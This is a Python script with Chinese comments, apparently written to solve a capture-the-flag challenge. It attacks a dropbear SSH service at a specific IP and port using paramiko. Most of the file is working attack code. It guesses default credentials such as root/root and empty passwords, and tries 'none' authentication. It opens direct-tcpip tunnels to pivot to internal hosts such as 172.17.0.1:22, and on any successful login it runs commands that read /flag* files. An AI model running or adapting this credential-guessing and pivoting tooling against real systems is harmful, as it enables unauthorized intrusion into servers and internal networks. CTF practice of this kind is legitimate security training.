#!/usr/bin/env python3
"""
关键洞察回顾：

已知信息：
1. dropbear 在 61.147.171.105:55300
2. ctf/123456 可以登录dropbear
3. 登录后执行命令返回空（容器受限）
4. direct-tcpip 可以连接到 172.17.0.1:22 (OpenSSH)
5. 通过direct-tcpip连接的SSH需要认证，但ctf/123456不行

提示说 "第二次SSH连接的错误信息是有用的提示"
这可能意味着：
- 我们应该建立嵌套SSH连接
- 第二次连接的错误能告诉我们正确的方向

新思路：
---------
当ctf@localhost认证失败时，dropbear可能在转发！
让我们捕获转发时dropbear收到的banner来确认它连接到了哪里。

更重要的是：如果dropbear正在代理第二次SSH连接，
我们的SSH数据流可能直接到达了目标主机！
这意味着我们其实是在和目标主机进行SSH协商！
"""

import paramiko
import socket
import time
import traceback

TARGET_HOST = "61.147.171.105"
TARGET_PORT = 55300
PASSWORD = "123456"

def raw_connect_and_analyze(username):
    """使用原始socket分析连接行为"""
    print(f"\n[*] 测试用户名: {username}")
    print("-" * 50)
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(10)
    
    try:
        sock.connect((TARGET_HOST, TARGET_PORT))
        
        # 1. 读取banner
        banner = sock.recv(1024)
        print(f"  Banner: {banner}")
        
        # 2. 发送我们的banner
        sock.send(b"SSH-2.0-paramiko_test\r\n")
        
        # 3. 等待并读取更多数据
        time.sleep(0.5)
        sock.setblocking(False)
        extra = b""
        try:
            while True:
                data = sock.recv(4096)
                if not data:
                    break
                extra += data
        except:
            pass
        
        if extra:
            print(f"  Extra data: {len(extra)} bytes")
            # 检查是否是另一个SSH banner
            if b"SSH-" in extra:
                print(f"  [!] 发现嵌入的SSH banner!")
                
        sock.close()
        return banner
        
    except Exception as e:
        print(f"  Error: {e}")
        return None

# 使用paramiko进行更深入的测试
def test_nested_ssh_via_proxy():
    """
    理论：
    当我们使用 ctf@172.17.0.1 登录时，
    dropbear可能将整个SSH会话代理到 172.17.0.1
    
    这意味着认证实际上是在 172.17.0.1 上进行的！
    
    问题：172.17.0.1 的有效凭据是什么？
    """
    
    print("=" * 70)
    print("[*] 测试SSH代理行为")
    print("=" * 70)
    
    # 尝试不同的用户名和密码组合
    test_cases = [
        # 标准测试
        ("ctf", "123456"),          # 应该成功
        ("ctf@localhost", "123456"), # 代理到localhost
        ("ctf@127.0.0.1", "123456"), # 代理到127.0.0.1
        
        # 如果代理到172.17.0.1,尝试ubuntu服务器的常见用户
        ("ctf@172.17.0.1", "123456"),
        ("root@172.17.0.1", "123456"),
        ("root@172.17.0.1", "root"),
        ("root@172.17.0.1", ""),
        ("ubuntu@172.17.0.1", "123456"),
        ("ubuntu@172.17.0.1", "ubuntu"),
        
        # 也许目标有免密登录？
        ("ctf@172.17.0.1", ""),
        ("root@172.17.0.1", ""),
        ("user@172.17.0.1", ""),
    ]
    
    for username, password in test_cases:
        try:
            transport = paramiko.Transport((TARGET_HOST, TARGET_PORT))
            transport.connect()
            
            # 获取host key来确认目标
            host_key = transport.get_remote_server_key()
            key_fp = host_key.get_fingerprint().hex()
            
            try:
                if password:
                    transport.auth_password(username, password)
                else:
                    # 尝试none认证
                    transport.auth_none(username)
                print(f"[+] {username}:{password} => 成功! (host key: {key_fp[:16]})")
                
                # 尝试执行命令
                channel = transport.open_channel("session")
                channel.exec_command("id")
                time.sleep(1)
                output = b""
                while channel.recv_ready():
                    output += channel.recv(4096)
                print(f"    Output: {output.decode(errors='replace')[:100]}")
                channel.close()
                
            except paramiko.AuthenticationException as e:
                print(f"[-] {username}:{password} => 认证失败 (host key: {key_fp[:16]})")
            except paramiko.SSHException as e:
                print(f"[?] {username}:{password} => SSH错误: {e}")
                
            transport.close()
            
        except Exception as e:
            if "banner" in str(e).lower() or "eof" in str(e).lower():
                print(f"[!] {username}:{password} => 连接关闭")
            else:
                print(f"[!] {username}:{password} => 错误: {e}")
        
        time.sleep(0.5)

def test_direct_tcpip_with_real_host():
    """
    通过direct-tcpip连接真实主机，然后测试SSH认证
    """
    
    print("\n" + "=" * 70)
    print("[*] 通过direct-tcpip通道测试真实主机的SSH认证")
    print("=" * 70)
    
    # 首先建立到dropbear的连接
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    try:
        client.connect(
            TARGET_HOST, TARGET_PORT,
            username="ctf",
            password="123456",
            timeout=10
        )
        
        transport = client.get_transport()
        
        # 通过direct-tcpip连接到真实主机
        target_hosts = [
            ("172.17.0.1", 22),
            ("10.42.0.1", 22),
            ("localhost", 22),
            ("127.0.0.1", 22),
        ]
        
        for target_host, target_port in target_hosts:
            print(f"\n[*] 尝试direct-tcpip到 {target_host}:{target_port}")
            
            try:
                channel = transport.open_channel(
                    "direct-tcpip",
                    (target_host, target_port),
                    ("127.0.0.1", 0)
                )
                
                # 读取SSH banner
                channel.settimeout(5)
                banner = channel.recv(1024)
                print(f"  Banner: {banner.decode(errors='replace').strip()}")
                
                # 尝试在这个通道上进行SSH认证
                # 创建一个socket-like对象
                print(f"  [*] 尝试在此通道上进行SSH认证...")
                
                # 发送我们的banner
                channel.send(b"SSH-2.0-paramiko_nested\r\n")
                
                # 使用paramiko在此通道上建立SSH会话
                nested_transport = paramiko.Transport(channel)
                nested_transport.connect()
                
                nested_key = nested_transport.get_remote_server_key()
                nested_fp = nested_key.get_fingerprint().hex()
                print(f"  Host Key: {nested_fp}")
                
                # 尝试各种认证
                test_auths = [
                    ("ctf", "123456"),
                    ("root", "123456"),
                    ("root", "root"),
                    ("root", ""),
                    ("ubuntu", "123456"),
                    ("ubuntu", "ubuntu"),
                ]
                
                for u, p in test_auths:
                    try:
                        if p:
                            nested_transport.auth_password(u, p)
                        else:
                            nested_transport.auth_none(u)
                        print(f"  [+] {u}:{p} => 认证成功!")
                        
                        # 执行命令
                        nested_channel = nested_transport.open_channel("session")
                        nested_channel.exec_command("id; cat /etc/hostname; cat /flag* 2>/dev/null")
                        time.sleep(1)
                        output = b""
                        while nested_channel.recv_ready():
                            output += nested_channel.recv(4096)
                        print(f"  Output: {output.decode(errors='replace')}")
                        nested_channel.close()
                        break
                        
                    except paramiko.AuthenticationException:
                        print(f"  [-] {u}:{p} => 认证失败")
                    except Exception as e:
                        print(f"  [?] {u}:{p} => {type(e).__name__}: {e}")
                
                nested_transport.close()
                
            except Exception as e:
                print(f"  Error: {type(e).__name__}: {e}")
            
            time.sleep(0.5)
        
        client.close()
        
    except Exception as e:
        print(f"Error: {e}")
        traceback.print_exc()

def test_publickey_forwarding():
    """
    测试公钥认证转发
    
    假设：dropbear可能有一个私钥用于连接真实主机
    如果dropbear使用自己的私钥进行代理认证...
    我们需要让dropbear用它的私钥而不是我们的密码！
    """
    
    print("\n" + "=" * 70)
    print("[*] 测试公钥认证行为")
    print("=" * 70)
    
    # 生成一个测试密钥
    from paramiko import RSAKey
    import io
    
    # 生成密钥对
    key = RSAKey.generate(2048)
    
    print("[*] 生成了测试RSA密钥")
    
    # 尝试使用公钥认证
    test_users = ["ctf", "ctf@localhost", "ctf@172.17.0.1", "root@172.17.0.1"]
    
    for username in test_users:
        try:
            transport = paramiko.Transport((TARGET_HOST, TARGET_PORT))
            transport.connect()
            
            try:
                transport.auth_publickey(username, key)
                print(f"[+] {username} => 公钥认证成功!")
            except paramiko.AuthenticationException as e:
                print(f"[-] {username} => 公钥认证失败: {e}")
            except paramiko.SSHException as e:
                print(f"[?] {username} => SSH错误: {e}")
                
            transport.close()
            
        except Exception as e:
            if "banner" in str(e).lower():
                print(f"[!] {username} => 连接关闭")
            else:
                print(f"[!] {username} => {e}")
        
        time.sleep(0.5)

def analyze_forwarding_behavior():
    """
    深入分析：当我们使用 ctf@localhost 时发生了什么？
    
    可能的情况：
    1. dropbear解析用户名，发现@后面是目标主机
    2. dropbear建立到目标主机的SSH连接
    3. dropbear将我们的认证信息转发给目标
    4. 目标认证失败，dropbear返回失败
    
    关键问题：dropbear用什么凭据连接目标？
    - 如果用我们的密码 => 需要找到正确的用户名/密码
    - 如果用自己的密钥 => 我们不需要知道密码！
    """
    
    print("\n" + "=" * 70)
    print("[*] 分析转发认证行为")
    print("=" * 70)
    
    print("""
    测试策略：
    1. 比较 ctf 和 ctf@localhost 的host key
    2. 如果host key不同，说明确实转发到了不同的服务器
    3. 检查错误消息以获取更多信息
    """)
    
    def get_host_key_and_auth(username, password):
        try:
            transport = paramiko.Transport((TARGET_HOST, TARGET_PORT))
            transport.start_client()
            
            host_key = transport.get_remote_server_key()
            key_type = host_key.get_name()
            key_fp = host_key.get_fingerprint().hex()
            
            auth_methods = []
            try:
                transport.auth_none(username)
            except paramiko.BadAuthenticationType as e:
                auth_methods = e.allowed_types
            except:
                pass
            
            try:
                transport.auth_password(username, password)
                result = "success"
            except paramiko.AuthenticationException:
                result = "auth_failed"
            except Exception as e:
                result = f"error: {e}"
            
            transport.close()
            return {
                "key_type": key_type,
                "key_fp": key_fp,
                "auth_methods": auth_methods,
                "result": result
            }
            
        except Exception as e:
            return {"error": str(e)}
    
    test_cases = [
        ("ctf", "123456"),
        ("ctf@localhost", "123456"),
        ("ctf@172.17.0.1", "123456"),
    ]
    
    print(f"\n{'用户名':30} {'Host Key':20} {'认证方法':20} {'结果':15}")
    print("-" * 85)
    
    for username, password in test_cases:
        info = get_host_key_and_auth(username, password)
        if "error" in info:
            print(f"{username:30} {'ERROR':20} {'-':20} {info['error'][:15]}")
        else:
            print(f"{username:30} {info['key_fp'][:20]} {str(info['auth_methods']):20} {info['result']:15}")
        time.sleep(0.5)

# 运行测试
if __name__ == "__main__":
    analyze_forwarding_behavior()
    print("\n")
    test_nested_ssh_via_proxy()
    print("\n")
    test_direct_tcpip_with_real_host()
    print("\n")
    test_publickey_forwarding()
